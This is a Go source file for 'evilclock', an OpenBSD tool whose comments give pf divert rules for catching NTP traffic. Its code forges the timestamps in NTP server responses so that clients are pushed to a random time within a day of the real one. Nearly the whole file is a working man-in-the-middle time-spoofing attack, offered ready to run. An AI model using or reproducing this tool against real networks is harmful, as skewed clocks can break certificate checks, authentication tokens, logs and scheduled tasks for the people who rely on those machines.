// evilclock.go - setting random (arbitrary) time on NTP clients
//
// To the extent possible under law, Ivan Markin waived all copyright
// and related or neighboring rights to evilclock, using the creative
// commons "cc0" public domain dedication. See LICENSE or
// <http://creativecommons.org/publicdomain/zero/1.0/> for full details.

// +build openbsd

/*
evilclock spoofs responses from the NTP server and forges timestamps.
It works using OpenBSD divert(4) sockets to feed packet through itself.
Add these rules to your /etc/pf.conf:

 pass out quick on egress inet proto udp to port ntp divert-packet port 700

 pass in quick on egress inet proto udp from port ntp divert-packet port 700

*/

package main

import (
	"log"
	"time"

	"github.com/google/gopacket"
	"github.com/google/gopacket/layers"
	"github.com/nogoegst/divert"
	"github.com/nogoegst/pktconn"
	"github.com/nogoegst/rand"
	"golang.org/x/sys/unix"
)

var NTPEpoch = time.Date(1900, 1, 1, 0, 0, 0, 0, time.UTC)

func TimeToNTPSeconds(t time.Time) uint64 {
	tt := t.Sub(NTPEpoch)
	sec := tt / time.Second
	return uint64(sec) << 32
}

// To avoid overflows
func NTPDelta(a, b uint64) int64 {
	if a > b {
		return int64(a - b)
	}
	return -1 * int64(b-a)
}

// Returns random time in interval [now-d/2:now+d/2)
func RandomTime(d time.Duration) time.Time {
	delta := time.Duration(rand.Int63n(int64(d))) - d/2
	t := time.Now().Add(delta)
	return t
}

// Spoofs responses from NTP server and sets time returned from tf().
func SpoofNTPResponse(pc *pktconn.PacketConn, tf func() time.Time) error {
	packetSource := gopacket.NewPacketSource(pc, layers.LayerTypeIPv4)
	buf := gopacket.NewSerializeBuffer()
	opts := gopacket.SerializeOptions{
		ComputeChecksums: false,
	}
	for {
		packet, err := packetSource.NextPacket()
		if err != nil {
			return err
		}
		ntpLayer := packet.Layer(layers.LayerTypeNTP)
		if ntpLayer == nil {
			log.Printf("layer NTP not found")
			log.Printf("%v", packet)
			err := pc.WritePacketData(packet.Data())
			if err != nil {
				return err
			}
			continue
		}
		ntp := ntpLayer.(*layers.NTP)
		if ntp.Mode != 4 { // we modify only NTP responses
			err := pc.WritePacketData(packet.Data())
			if err != nil {
				return err
			}
			continue
		}
		t := tf()
		log.Printf("Forcing time to be %v", t)
		delta := layers.NTPTimestamp(NTPDelta(TimeToNTPSeconds(t), uint64(ntp.ReferenceTimestamp)))
		// Alter all remote timestamps
		ntp.ReferenceTimestamp += delta
		ntp.TransmitTimestamp += delta
		ntp.ReceiveTimestamp += delta

		buf.Clear()
		err = gopacket.SerializePacket(buf, opts, packet)
		if err != nil {
			return err
		}
		err = pc.WritePacketData(buf.Bytes())
		if err != nil {
			return err
		}
	}
	return nil
}

func main() {
	err := unix.Pledge("stdio inet", nil)
	if err != nil {
		log.Fatal(err)
	}
	d, err := divert.Listen("divert", "700")
	if err != nil {
		log.Fatal(err)
	}

	pc, err := pktconn.New(d, 2048)
	if err != nil {
		log.Fatal(err)
	}
	defer pc.Close()
	err = SpoofNTPResponse(pc, func() time.Time {
		return RandomTime(24 * time.Hour)
	})
	log.Fatal(err)
}
